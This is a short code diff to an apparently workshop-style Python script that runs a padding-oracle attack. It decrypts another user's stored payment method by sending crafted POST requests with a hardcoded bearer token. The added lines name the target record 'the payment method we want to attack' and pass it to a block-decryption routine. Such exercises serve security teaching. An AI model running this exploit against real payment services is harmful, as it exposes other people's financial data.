@@ -13,6 +13,14 @@ db_session = scoped_session(sessionmaker(autocommit=False,
 Base = declarative_base()
 Base.query = db_session.query_property()
 
+## WORKSHOP - Make sure these values are correct
+token = "token456" # User 2's token
+headers = {
+    "Authorization": f"Bearer {token}"
+}
+# The payment method we want to attack
+payment_method_id = 2680
+
 @dataclass
 class PaymentMethod(Base):
     __tablename__ = "payment_methods"
@@ -60,7 +68,7 @@ def check_candidate_padding(payment_method_id):
     url = f"{base_url}{payment_method_id}"
     try:
         # Make the HTTP POST request
-        response = requests.post(url)
+        response = requests.post(url, headers=headers)
         print("URL: %s", url)
         # Check for success (HTTP status code 2xx)
         print(response)
@@ -101,6 +109,7 @@ def attack_second_block(payment_method):
     return bytes(a ^ b for a, b in zip(ct[:16], zeroizing_iv)).decode("utf-8")
         
     
-pm = get_payment_method(3)
+pm = get_payment_method(payment_method_id)
+print(pm)
 result = attack_second_block(pm)
 print(result)
